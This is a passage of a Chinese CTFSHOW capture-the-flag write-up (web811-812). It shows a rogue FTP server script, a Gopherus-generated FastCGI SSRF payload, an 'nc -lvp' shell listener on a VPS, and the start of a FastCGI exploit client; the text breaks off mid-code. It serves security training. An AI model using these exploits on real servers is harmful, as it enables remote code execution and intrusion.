{"blogid": "124038567", "writerAge": "码龄3年", "writerBlogNum": "107", "writerCollect": "682", "writerComment": "269", "writerFan": "1517", "writerGrade": "5级", "writerIntegral": "3140", "writerName": "yu22x", "writerProfileAdress": "writer_image\\profile_124038567.jpg", "writerRankTotal": "8345", "writerRankWeekly": "12134", "writerThumb": "446", "writerVisitNum": "242014", "blog_read_count": "1061", "blog_time": "已于 2022-06-06 14:36:59 修改", "blog_title": "CTFSHOW 常用姿势篇（811-820）", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<h1><a id=\"CTFSHOW__0\"></a>CTFSHOW 常用姿势篇</h1>\n<p><em>群主在视频里面已经讲解的很清楚了，下面内容有些简略，就当补充下payload了。</em><br/> </p>\n<div class=\"toc\">\n<h3>文章目录</h3>\n<ul><li><a href=\"#CTFSHOW__0\">CTFSHOW 常用姿势篇</a></li><li><ul><li><a href=\"#web811_3\">web811</a></li><li><a href=\"#web812_46\">web812</a></li><li><a href=\"#web813_306\">web813</a></li><li><a href=\"#web814_334\">web814</a></li><li><a href=\"#web815_361\">web815</a></li><li><a href=\"#web816_377\">web816</a></li><li><a href=\"#web817_389\">web817</a></li><li><a href=\"#web818_391\">web818</a></li><li><a href=\"#web819_453\">web819</a></li><li><a href=\"#web820_468\">web820</a></li></ul>\n</li></ul>\n</div>\n<p></p>\n<h2><a id=\"web811_3\"></a>web811</h2>\n<p><strong>1、搭建恶意ftp服务器</strong></p>\n<pre><code class=\"prism language-python\"><span class=\"token keyword\">import</span> socket\ns <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span>\ns<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">,</span><span class=\"token number\">4566</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#端口可改</span>\ns<span class=\"token punctuation\">.</span>listen<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\nconn<span class=\"token punctuation\">,</span> addr <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>accept<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nconn<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'220 welcome\\n'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#Service ready for new user.</span>\n<span class=\"token comment\">#Client send anonymous username</span>\n<span class=\"token comment\">#USER anonymous</span>\nconn<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'331 Please specify the password.\\n'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#User name okay, need password.</span>\n<span class=\"token comment\">#Client send anonymous password.</span>\n<span class=\"token comment\">#PASS anonymous</span>\nconn<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'230 Login successful.\\n'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#User logged in, proceed. Logged out if appropriate.</span>\n<span class=\"token comment\">#TYPE I</span>\nconn<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'200 Switching to Binary mode.\\n'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#Size /</span>\nconn<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'550 Could not get the file size.\\n'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#EPSV (1)</span>\nconn<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'150 ok\\n'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#PASV</span>\nconn<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\\n'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#STOR / (2)</span>\nconn<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'150 Permission denied.\\n'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#QUIT</span>\nconn<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'221 Goodbye.\\n'</span><span class=\"token punctuation\">)</span>\nconn<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<p><strong>在vps上运行python shell.py</strong></p>\n<p><strong>2、利用gopherus生成payload</strong><br/> <img alt=\"在这里插入图片描述\" src=\"image\\f5e1c2950ab34905bcad570554dc3e81.png\"/><br/> 只取下划线后面的部分<br/> <strong>3、vps开启监听 nc -lvp 4567</strong><br/> <strong>4、发送payload</strong></p>\n<pre><code>ile=ftp://x.x.x.x:4566&amp;content=gopherus生成的payload(只取下划线后面的内容，且不需要再次编码)\n</code></pre>\n<p><strong>5、得到flag</strong><br/> <img alt=\"在这里插入图片描述\" src=\"image\\95e151c03e434949a78322ace487b780.png\"/></p>\n<h2><a id=\"web812_46\"></a>web812</h2>\n<p>exp</p>\n<pre><code class=\"prism language-python\"><span class=\"token keyword\">import</span> socket\n<span class=\"token keyword\">import</span> random\n<span class=\"token keyword\">import</span> argparse\n<span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">from</span> io <span class=\"token keyword\">import</span> BytesIO\n\n<span class=\"token comment\"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span>\n\nPY2 <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span> <span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>version_info<span class=\"token punctuation\">.</span>major <span class=\"token operator\">==</span> <span class=\"token number\">2</span> <span class=\"token keyword\">else</span> <span class=\"token boolean\">False</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">bchr</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> PY2<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> force_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">bord</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> c\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">force_bytes</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> s\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> s<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'strict'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">force_text</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">issubclass</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> s\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        s <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'strict'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        s <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> s\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">FastCGIClient</span><span class=\"token punctuation\">:</span>\n    <span class=\"token triple-quoted-string string\">\"\"\"A Fast-CGI Client for Python\"\"\"</span>\n\n    <span class=\"token comment\"># private</span>\n    __FCGI_VERSION <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n\n    __FCGI_ROLE_RESPONDER <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n    __FCGI_ROLE_AUTHORIZER <span class=\"token operator\">=</span> <span class=\"token number\">2</span>\n    __FCGI_ROLE_FILTER <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\n\n    __FCGI_TYPE_BEGIN <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n    __FCGI_TYPE_ABORT <span class=\"token operator\">=</span> <span class=\"token number\">2</span>\n    __FCGI_TYPE_END <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\n    __FCGI_TYPE_PARAMS <span class=\"token operator\">=</span> <span class=\"token number\">4</span>\n    __FCGI_TYPE_STDIN <span class=\"token operator\">=</span> <span class=\"token number\">5</span>\n    __FCGI_TYPE_STDOUT <span class=\"token operator\">=</span> <span class=\"token number\">6</span>\n    __FCGI_TYPE_STDERR <span class=\"token operator\">=</span> <span class=\"token number\">7</span>\n    __FCGI_TYPE_DATA <span class=\"token operator\">=</span> <span class=\"token number\">8</span>\n    __FCGI_TYPE_GETVALUES <span class=\"token operator\">=</span> <span class=\"token number\">9</span>\n    __FCGI_TYPE_GETVALUES_RESULT <span class=\"token operator\">=</span> <span class=\"token number\">10</span>\n    __FCGI_TYPE_UNKOWNTYPE <span class=\"token operator\">=</span> <span class=\"token number\">11</span>\n\n    __FCGI_HEADER_SIZE <span class=\"token operator\">=</span> <span class=\"token number\">8</span>\n\n    <span class=\"token comment\"># request state</span>\n    FCGI_STATE_SEND <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n    FCGI_STATE_ERROR <span class=\"token operator\">=</span> <span class=\"token number\">2</span>\n    FCGI_STATE_SUCCESS <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">,</span> timeout<span class=\"token punctuation\">,</span> keepalive<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>host <span class=\"token operator\">=</span> host\n        self<span class=\"token punctuation\">.</span>port <span class=\"token operator\">=</span> port\n        self<span class=\"token punctuation\">.</span>timeout <span class=\"token operator\">=</span> timeout\n        <span class=\"token keyword\">if</span> keepalive<span class=\"token punctuation\">:</span>\n            self<span class=\"token punctuation\">.</span>keepalive <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            self<span class=\"token punctuation\">.</span>keepalive <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n        self<span class=\"token punctuation\">.</span>sock <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\n        self<span class=\"token punctuation\">.</span>requests <span class=\"token operator\">=</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__connect</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>sock <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>sock<span class=\"token punctuation\">.</span>settimeout<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>timeout<span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>sock<span class=\"token punctuation\">.</span>setsockopt<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>SOL_SOCKET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SO_REUSEADDR<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># if self.keepalive:</span>\n        <span class=\"token comment\">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span>\n        <span class=\"token comment\"># else:</span>\n        <span class=\"token comment\">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            self<span class=\"token punctuation\">.</span>sock<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">except</span> socket<span class=\"token punctuation\">.</span>error <span class=\"token keyword\">as</span> msg<span class=\"token punctuation\">:</span>\n            self<span class=\"token punctuation\">.</span>sock<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            self<span class=\"token punctuation\">.</span>sock <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">repr</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__encodeFastCGIRecord</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> fcgi_type<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">,</span> requestid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        length <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span>\n        buf <span class=\"token operator\">=</span> bchr<span class=\"token punctuation\">(</span>FastCGIClient<span class=\"token punctuation\">.</span>__FCGI_VERSION<span class=\"token punctuation\">)</span> \\\n               <span class=\"token operator\">+</span> bchr<span class=\"token punctuation\">(</span>fcgi_type<span class=\"token punctuation\">)</span> \\\n               <span class=\"token operator\">+</span> bchr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>requestid <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">)</span> \\\n               <span class=\"token operator\">+</span> bchr<span class=\"token punctuation\">(</span>requestid <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">)</span> \\\n               <span class=\"token operator\">+</span> bchr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>length <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">)</span> \\\n               <span class=\"token operator\">+</span> bchr<span class=\"token punctuation\">(</span>length <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">)</span> \\\n               <span class=\"token operator\">+</span> bchr<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> \\\n               <span class=\"token operator\">+</span> bchr<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> \\\n               <span class=\"token operator\">+</span> content\n        <span class=\"token keyword\">return</span> buf\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__encodeNameValueParams</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        nLen <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span>\n        vLen <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span>\n        record <span class=\"token operator\">=</span> <span class=\"token string\">b''</span>\n        <span class=\"token keyword\">if</span> nLen <span class=\"token operator\">&lt;</span> <span class=\"token number\">128</span><span class=\"token punctuation\">:</span>\n            record <span class=\"token operator\">+=</span> bchr<span class=\"token punctuation\">(</span>nLen<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            record <span class=\"token operator\">+=</span> bchr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>nLen <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span> \\\n                      <span class=\"token operator\">+</span> bchr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>nLen <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">)</span> \\\n                      <span class=\"token operator\">+</span> bchr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>nLen <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">)</span> \\\n                      <span class=\"token operator\">+</span> bchr<span class=\"token punctuation\">(</span>nLen <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> vLen <span class=\"token operator\">&lt;</span> <span class=\"token number\">128</span><span class=\"token punctuation\">:</span>\n            record <span class=\"token operator\">+=</span> bchr<span class=\"token punctuation\">(</span>vLen<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            record <span class=\"token operator\">+=</span> bchr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>vLen <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span> \\\n                      <span class=\"token operator\">+</span> bchr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>vLen <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">)</span> \\\n                      <span class=\"token operator\">+</span> bchr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>vLen <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">)</span> \\\n                      <span class=\"token operator\">+</span> bchr<span class=\"token punctuation\">(</span>vLen <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> record <span class=\"token operator\">+</span> name <span class=\"token operator\">+</span> value\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__decodeFastCGIHeader</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> stream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        header <span class=\"token operator\">=</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        header<span class=\"token punctuation\">[</span><span class=\"token string\">'version'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> bord<span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        header<span class=\"token punctuation\">[</span><span class=\"token string\">'type'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> bord<span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        header<span class=\"token punctuation\">[</span><span class=\"token string\">'requestId'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>bord<span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> bord<span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        header<span class=\"token punctuation\">[</span><span class=\"token string\">'contentLength'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>bord<span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> bord<span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        header<span class=\"token punctuation\">[</span><span class=\"token string\">'paddingLength'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> bord<span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        header<span class=\"token punctuation\">[</span><span class=\"token string\">'reserved'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> bord<span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> header\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__decodeFastCGIRecord</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> <span class=\"token builtin\">buffer</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        header <span class=\"token operator\">=</span> <span class=\"token builtin\">buffer</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>__FCGI_HEADER_SIZE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> header<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            record <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>__decodeFastCGIHeader<span class=\"token punctuation\">(</span>header<span class=\"token punctuation\">)</span>\n            record<span class=\"token punctuation\">[</span><span class=\"token string\">'content'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">b''</span>\n            \n            <span class=\"token keyword\">if</span> <span class=\"token string\">'contentLength'</span> <span class=\"token keyword\">in</span> record<span class=\"token punctuation\">.</span>keys<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                contentLength <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>record<span class=\"token punctuation\">[</span><span class=\"token string\">'contentLength'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n                record<span class=\"token punctuation\">[</span><span class=\"token string\">'content'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token builtin\">buffer</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span>contentLength<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token string\">'paddingLength'</span> <span class=\"token keyword\">in</span> record<span class=\"token punctuation\">.</span>keys<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                skiped <span class=\"token operator\">=</span> <span class=\"token builtin\">buffer</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>record<span class=\"token punctuation\">[</span><span class=\"token string\">'paddingLength'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> record\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">request</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> nameValuePairs<span class=\"token operator\">=</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> post<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> self<span class=\"token punctuation\">.</span>__connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'connect failure! please check your fasctcgi-server !!'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span>\n\n        requestId <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>requests<span class=\"token punctuation\">[</span>requestId<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        request <span class=\"token operator\">=</span> <span class=\"token string\">b\"\"</span>\n        beginFCGIRecordContent <span class=\"token operator\">=</span> bchr<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> \\\n                                 <span class=\"token operator\">+</span> bchr<span class=\"token punctuation\">(</span>FastCGIClient<span class=\"token punctuation\">.</span>__FCGI_ROLE_RESPONDER<span class=\"token punctuation\">)</span> \\\n                                 <span class=\"token operator\">+</span> bchr<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>keepalive<span class=\"token punctuation\">)</span> \\\n                                 <span class=\"token operator\">+</span> bchr<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">5</span>\n        request <span class=\"token operator\">+=</span> self<span class=\"token punctuation\">.</span>__encodeFastCGIRecord<span class=\"token punctuation\">(</span>FastCGIClient<span class=\"token punctuation\">.</span>__FCGI_TYPE_BEGIN<span class=\"token punctuation\">,</span>\n                                              beginFCGIRecordContent<span class=\"token punctuation\">,</span> requestId<span class=\"token punctuation\">)</span>\n        paramsRecord <span class=\"token operator\">=</span> <span class=\"token 